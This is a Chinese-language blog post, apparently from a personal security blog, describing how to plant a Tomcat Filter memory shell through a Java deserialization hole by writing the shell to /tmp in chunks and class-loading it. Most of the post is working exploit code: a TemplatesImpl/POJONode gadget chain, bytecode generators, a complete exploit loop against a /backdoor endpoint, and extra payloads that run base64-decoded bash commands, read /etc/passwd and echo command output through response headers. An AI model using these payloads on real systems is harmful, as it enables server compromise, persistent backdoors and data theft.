@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            实践：分块传输打内存马
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <p>原理：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/863792">https://developer.aliyun.com/article/863792</a></p>
+<p>要用到的工具：<a target="_blank" rel="noopener" href="https://github.com/un1novvn/Java-unser-utils">https://github.com/un1novvn/Java-unser-utils</a></p>
+<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>分块传输原理：将大马写入到远程机文件中，写入完成后使用类加载去加载他。</p>
+<p>适用情况：限制payload长度，rce无回显，不出网，不出dns。</p>
+<p>实现思路：发送2种payload：payload1负责追加写入.class文件，payload2负责类加载，这两种payload必须都小于长度限制。</p>
+<p>exploit流程：</p>
+<p>1、获取大马字节码，分割成小片段。</p>
+<p>2、遍历小片段，将小片段填入写文件的小马，确定写入的位置和写入文件名。生成字节码，生成序列化对象，这是payload1。发送payload1到远程。</p>
+<p>3、遍历结束后，大马已经完全写入到远程文件。此时生成payload2，发送，执行类加载。</p>
+<h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><h2 id="分割大马"><a href="#分割大马" class="headerlink" title="分割大马"></a>分割大马</h2><p>chunkSize根据实际情况填。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static byte[][] splitByteArray(byte[] byteArray, int chunkSize) &#123;</span><br><span class="line">    int numOfChunks = (int) Math.ceil((double) byteArray.length / chunkSize);</span><br><span class="line">    byte[][] result = new byte[numOfChunks][];</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; numOfChunks; i++) &#123;</span><br><span class="line">        int start = i * chunkSize;</span><br><span class="line">        int length = Math.min(byteArray.length - start, chunkSize);</span><br><span class="line">        byte[] chunk = Arrays.copyOfRange(byteArray, start, start + length);</span><br><span class="line">        result[i] = chunk;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>构造追加写文件用的马子。</p>
+<p>将大马的小片段填入byte数组。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public A()&#123;</span><br><span class="line">   try &#123;</span><br><span class="line">       String path = &quot;/tmp/aaa&quot;;</span><br><span class="line">       File file = new File(path);</span><br><span class="line">       FileOutputStream fos = new FileOutputStream(path, true);</span><br><span class="line">       byte[] data = &#123;1,1,1&#125;;</span><br><span class="line">       fos.write(data);</span><br><span class="line">       fos.close();</span><br><span class="line">   &#125; catch (Exception ignore) &#123;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h2><p>构造类加载用的马。</p>
+<p>注意看URLClassLoader构造函数第二个参数是ContextClassLoader。若不加这个，加载tomcat Filter 内存马时报错：<code>ClassNotFound: javax.servlet.Filter</code>。因为单纯一个URLClassLoader在<code>/tmp</code>没有找到Filter，所以要添加一个父加载器，他才能找到Filter。</p>
+<p>测试发现，<code>ClassLoader.getSystemClassLoader()</code>这个加载器也找不到Filter。这和Tomcat类加载机制有关。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public A()&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">    	String path = &quot;file:///tmp/&quot;;</span><br><span class="line">        java.net.URL url = new java.net.URL(path);</span><br><span class="line">        java.net.URLClassLoader urlClassLoader = new java.net.URLClassLoader(new java.net.URL[]&#123;url&#125;,Thread.currentThread().getContextClassLoader());</span><br><span class="line">        Class clazz = urlClassLoader.loadClass(&quot;Evil&quot;);           </span><br><span class="line">        clazz.newInstance();       </span><br><span class="line">        &#125;catch (Exception ignored) &#123;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="生成字节码"><a href="#生成字节码" class="headerlink" title="生成字节码"></a>生成字节码</h2><p>将上述用于写文件和类加载的代码填入下面的A类的构造函数即可生成字节码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static byte[] payload(String data,String filename) throws Exception&#123;</span><br><span class="line">    String s = &quot;public A()&#123;&#125;&quot;;</span><br><span class="line">    ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">    classPool.importPackage(Scanner.class.getName());</span><br><span class="line">    CtClass ctClass = classPool.get(AbstractTranslet.class.getName());</span><br><span class="line">    CtClass calc = classPool.makeClass(&quot;A&quot;);</span><br><span class="line">    calc.setSuperclass(ctClass);</span><br><span class="line">    CtConstructor ctConstructor = CtNewConstructor.make(s, calc);</span><br><span class="line">    calc.addConstructor(ctConstructor);</span><br><span class="line">    byte[] bytes = calc.toBytecode();</span><br><span class="line">    calc.defrost();</span><br><span class="line">    return bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="生成序列化对象"><a href="#生成序列化对象" class="headerlink" title="生成序列化对象"></a>生成序列化对象</h2><p>这一步将字节码包装进TemplatesImpl，然后组装gadget。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static Object wrap(byte[] code) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    TemplatesImpl o = Gadget.getTemplateImpl(code);</span><br><span class="line">    </span><br><span class="line">    // hashMap -&gt; XString -&gt; POJONode-&gt; TemplatesImpl</span><br><span class="line">    POJONode pojoNode = Gadget.getPOJONode(o);</span><br><span class="line">    HashMap hashMapXString = Gadget.get_HashMap_XString(pojoNode);</span><br><span class="line">    return hashMapXString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h1><p>手动封装的发请求的工具。</p>
+<h2 id="get"><a href="#get" class="headerlink" title="get"></a>get</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void get(String url, HashMap&lt;String,String&gt; params) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    String query = &quot;?&quot;;</span><br><span class="line">    for (String key : params.keySet()) &#123;</span><br><span class="line">        String value = params.get(key);</span><br><span class="line">        query += key +&quot;=&quot;+value;</span><br><span class="line">        query += &quot;&amp;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    query = query.substring(0,query.length()-1);</span><br><span class="line">    url += query;</span><br><span class="line">    // 创建 URL 对象</span><br><span class="line">    URL obj = new URL(url);</span><br><span class="line">    HttpURLConnection con = (HttpURLConnection) obj.openConnection();</span><br><span class="line">    // 获取响应</span><br><span class="line">    int responseCode = con.getResponseCode();</span><br><span class="line">    System.out.println(&quot;Response Code: &quot; + responseCode);</span><br><span class="line">    System.out.println(&quot;Response Headers: &quot; + con.getHeaderFields());</span><br><span class="line"></span><br><span class="line">    BufferedReader in = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        in = new BufferedReader(new InputStreamReader(con.getInputStream()));</span><br><span class="line">    &#125;catch (Exception e)&#123;</span><br><span class="line">        in = new BufferedReader(new InputStreamReader(con.getErrorStream()));</span><br><span class="line">    &#125;finally &#123;</span><br><span class="line">        String inputLine;</span><br><span class="line">        StringBuilder response = new StringBuilder();</span><br><span class="line">        while ((inputLine = in.readLine()) != null) &#123;</span><br><span class="line">            response.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;Response: &quot; + response.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="post"><a href="#post" class="headerlink" title="post"></a>post</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void post(String url,HashMap&lt;String,String&gt; params) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    // 创建 URL 对象</span><br><span class="line">    URL obj = new URL(url);</span><br><span class="line">    HttpURLConnection con = (HttpURLConnection) obj.openConnection();</span><br><span class="line"></span><br><span class="line">    String body = &quot;&quot;;</span><br><span class="line">    for (String key : params.keySet()) &#123;</span><br><span class="line">        String value = params.get(key);</span><br><span class="line">        body += key +&quot;=&quot;+value;</span><br><span class="line">        body += &quot;&amp;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    body = body.length() == 0 ? &quot;&quot; : body.substring(0,body.length()-1);</span><br><span class="line"></span><br><span class="line">    // 设置请求方法为 POST</span><br><span class="line">    con.setRequestMethod(&quot;POST&quot;);</span><br><span class="line">    // 设置请求头部信息</span><br><span class="line">    con.setRequestProperty(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line"></span><br><span class="line">    // 发送 POST 请求</span><br><span class="line">    con.setDoOutput(true);</span><br><span class="line">    try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) &#123;</span><br><span class="line">        wr.writeBytes(body);</span><br><span class="line">        wr.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取响应</span><br><span class="line">    int responseCode = con.getResponseCode();</span><br><span class="line">    System.out.println(&quot;Response Headers: &quot; + con.getHeaderFields().size());</span><br><span class="line">    System.out.println(&quot;Response Code: &quot; + responseCode);</span><br><span class="line"></span><br><span class="line">    try (BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()))) &#123;</span><br><span class="line">        String inputLine;</span><br><span class="line">        StringBuilder response = new StringBuilder();</span><br><span class="line">        while ((inputLine = in.readLine()) != null) &#123;</span><br><span class="line">            response.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        // 输出响应内容</span><br><span class="line">        System.out.println(&quot;Response Text: &quot; + response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void exploit()throws Exception&#123;</span><br><span class="line">    String url = &quot;http://192.168.109.128:18082/backdoor&quot;;</span><br><span class="line"></span><br><span class="line">    //存放请求参数</span><br><span class="line">    HashMap&lt;String, String&gt; params = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    byte[] bigHorse = Util.fil2ByteArray(&quot;FilterShell.class&quot;);</span><br><span class="line">    System.out.println(&quot;bigHorse length: &quot;+bigHorse.length);</span><br><span class="line"></span><br><span class="line">    // 将上一次失败的结果删掉</span><br><span class="line">    rce(url,&quot;rm /tmp/FilterShell.class&quot;);</span><br><span class="line">    sleep();</span><br><span class="line"></span><br><span class="line">    byte[][] bytes = Util.splitByteArray(bigHorse,100);</span><br><span class="line"></span><br><span class="line">    for (byte[] aByte : bytes) &#123;</span><br><span class="line">        // 将字节数组转换成 &#123;1,2,3,4,5&#125; 的形式传给写文件马然后再编译成字节码</span><br><span class="line">        Object writeHorse = wrap(SmallShell.writeByteHorse(aByte,&quot;/tmp/FilterShell.class&quot;));</span><br><span class="line">        String packet = Base64.getEncoder().encodeToString(Util.serialize(writeHorse));</span><br><span class="line">        System.out.println(&quot;writeHorse length: &quot;+packet.length());</span><br><span class="line">        params.put(&quot;payload&quot;,Util.URLEncode(packet));</span><br><span class="line">        Request.get(url,params);</span><br><span class="line">        sleep();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 传输类加载马，让他加载 /tmp/FilterShell.class 文件</span><br><span class="line">    Object loaderHorse = wrap(SmallShell.loaderHorse(&quot;FilterShell&quot;));</span><br><span class="line">    String loaderHorseBase = Base64.getEncoder().encodeToString(Util.serialize(loaderHorse));</span><br><span class="line">    System.out.println(&quot;loaderHorse Length: &quot;+loaderHorseBase.length());</span><br><span class="line">    params.put(&quot;payload&quot;,Util.URLEncode(loaderHorseBase));</span><br><span class="line">    Request.get(url,params);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="其他小马"><a href="#其他小马" class="headerlink" title="其他小马"></a>其他小马</h1><p>附上测试过程中用过的别的类型的小马。</p>
+<h2 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public A()&#123;</span><br><span class="line">	try &#123;</span><br><span class="line">            java.io.InputStream in = new java.io.FileInputStream(&quot;aaa&quot;);</span><br><span class="line">            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();</span><br><span class="line">            byte[] buffer = new byte[4096];</span><br><span class="line">            int n = 0;</span><br><span class="line">            while((n = in.read(buffer)) != -1) &#123;</span><br><span class="line">                out.write(buffer, 0, n);</span><br><span class="line">            &#125;</span><br><span class="line">            byte[] data =  out.toByteArray();</span><br><span class="line">            byte[] decodeBytes = java.util.Base64.getDecoder().decode(data);</span><br><span class="line">            new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(decodeBytes)).readObject();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>读取文件然后通过请求头返回</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public A()&#123;</span><br><span class="line">	javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();</span><br><span class="line">	java.lang.reflect.Field r=request.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">    r.setAccessible(true);</span><br><span class="line">    org.apache.catalina.connector.Response response = ((org.apache.catalina.connector.Request)r.get(request)).getResponse();</span><br><span class="line">    </span><br><span class="line">    response.setHeader(&quot;b&quot;,new java.util.Scanner(new java.io.File(&quot;/etc/passwd&quot;)).next());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Base64Decode"><a href="#Base64Decode" class="headerlink" title="Base64Decode"></a>Base64Decode</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public A()&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">           String path = &quot;/your/path&quot;;</span><br><span class="line">           FileInputStream fis = new FileInputStream(path);</span><br><span class="line">           // size取决于实际情况</span><br><span class="line">           byte[] data = new byte[size];</span><br><span class="line">           fis.read(data);</span><br><span class="line">           // 写入Evil.class</span><br><span class="line">           FileOutputStream fos = new FileOutputStream(&quot;Evil.class&quot;);</span><br><span class="line">           fos.write(Base64.getDecoder().decode(data));</span><br><span class="line">           fos.close();</span><br><span class="line">       &#125; catch (Exception ignored) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>不回显</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public A()&#123;</span><br><span class="line">	try()&#123;</span><br><span class="line">		Runtime.getRuntime().exec(&quot;bash -c &#123;echo,cmdBase64&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br><span class="line">	&#125;catch(Exception e)&#123;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有回显</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public A()&#123;</span><br><span class="line">	javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();</span><br><span class="line">	</span><br><span class="line">	java.lang.reflect.Field r=request.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">	</span><br><span class="line">    r.setAccessible(true);</span><br><span class="line">    org.apache.catalina.connector.Response response = ((org.apache.catalina.connector.Request)r.get(request)).getResponse();</span><br><span class="line">    </span><br><span class="line">    String s =new Scanner(Runtime.getRuntime().exec(“whoami”).getInputStream()).next();</span><br><span class="line">    response.setHeader(&quot;c&quot;, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="小马长度比较"><a href="#小马长度比较" class="headerlink" title="小马长度比较"></a>小马长度比较</h2><p>单纯只是小马的字节码长度，不是序列化对象的长度。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contextLoaderHorse: 803 //加入了 getContextClassLoader</span><br><span class="line">urlLoaderHorse: 633 //不加 getContextClassLoader</span><br><span class="line">rceHorse: 483 // 无回显rce</span><br><span class="line">rceWithResultHorse: 1525 // 有回显rce</span><br><span class="line">writeByteHorse: 506	//写入1个字节时该马的长度</span><br><span class="line">writeStringHorse: 559 //写入1个字符时该马的长度</span><br><span class="line">readObjectHorse: 934 //读取文件并反序列化</span><br><span class="line">readFileHorse: 1325 //读取文件并回显</span><br></pre></td></tr></table></figure>
+
+
+
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-text">构造payload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E5%89%B2%E5%A4%A7%E9%A9%AC"><span class="toc-text">分割大马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-text">类加载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">生成字节码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-text">生成序列化对象</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82"><span class="toc-text">发送请求</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#get"><span class="toc-text">get</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#post"><span class="toc-text">post</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exploit"><span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B0%8F%E9%A9%AC"><span class="toc-text">其他小马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#readObject"><span class="toc-text">readObject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Base64Decode"><span class="toc-text">Base64Decode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E9%A9%AC%E9%95%BF%E5%BA%A6%E6%AF%94%E8%BE%83"><span class="toc-text">小马长度比较</span></a></li></ol></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
